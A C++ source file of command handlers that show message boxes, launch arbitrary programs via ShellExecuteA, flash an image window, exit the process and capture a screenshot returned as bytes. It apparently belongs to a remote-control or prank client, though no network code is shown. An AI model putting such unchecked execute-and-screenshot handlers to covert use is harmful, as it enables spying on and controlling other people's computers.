#include "Commands.h"

void commands::showMessageBox(const std::vector<std::string>& args) 
{
    if (args.size() >= 2) {
        std::string title = args[0];
        std::string message = args[1];

        // Convert title and message to wide strings (required by MessageBoxW)
        std::wstring wTitle(title.begin(), title.end());
        std::wstring wMessage(message.begin(), message.end());

        // Show the Windows message box
        MessageBoxW(nullptr, wMessage.c_str(), wTitle.c_str(), MB_OK | MB_ICONINFORMATION);
    }
    else {
        std::cout << "Invalid number of arguments for 'MessageBox' command.\n";
    }
}

void commands::execute(const std::vector<std::string>& args)
{
    std::string stemp = std::string(args[0].begin(), args[0].end());
    LPCSTR sw = stemp.c_str();

    ShellExecuteA(0, 0, sw, 0, 0, SW_SHOW);
}

void commands::cringe()
{
    //std::cout << "Cringe() Will return once we can compile without SDL2\n";
    const int SCREEN_WIDTH = 1072;
    const int SCREEN_HEIGHT = 1092;

    SDL_Window* window = NULL;
    SDL_Surface* screenSurface = NULL;

    if (SDL_Init(SDL_INIT_VIDEO) < 0)
    {
        std::cerr << "SDL couldn't initialize: " << SDL_GetError() << std::endl;
        
    }

    window = SDL_CreateWindow("Postin' Cringe", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);
    if (window == NULL)
    {
        std::cerr << "Window couldn't be created: " << SDL_GetError() << std::endl;
        SDL_Quit();
        
    }

    // Get window surface
    screenSurface = SDL_GetWindowSurface(window);

    // Load image using SDL_Image
    SDL_Surface* imageSurface = IMG_Load("assets/imgs/cringe.jpg");
    if (!imageSurface)
    {
        std::cerr << "Failed to load image: " << IMG_GetError() << std::endl;
        SDL_DestroyWindow(window);
        SDL_Quit();
        
    }

    // Fill the surface white
    SDL_FillRect(screenSurface, NULL, SDL_MapRGB(screenSurface->format, 0xFF, 0xFF, 0xFF));

    // Blit the image surface onto the window surface
    SDL_BlitSurface(imageSurface, NULL, screenSurface, NULL);

    // Update the surface
    SDL_UpdateWindowSurface(window);

    // Wait for a while to see the image
    SDL_Delay(5000);

    // Destroy image surface and window
    SDL_FreeSurface(imageSurface);
    SDL_DestroyWindow(window);

    // Quit SDL subsystems
    SDL_Quit();
}

void commands::feesh()
{

}

void commands::StopProcess()
{
    ExitProcess(0);
}

std::vector<char> commands::Screenshot_C()
{
    // Takes the screenshot, and now there should be a file in the active directory called "screenshot.png"
    capture::screenshot();
    return file::readFile("screenshot.png");
}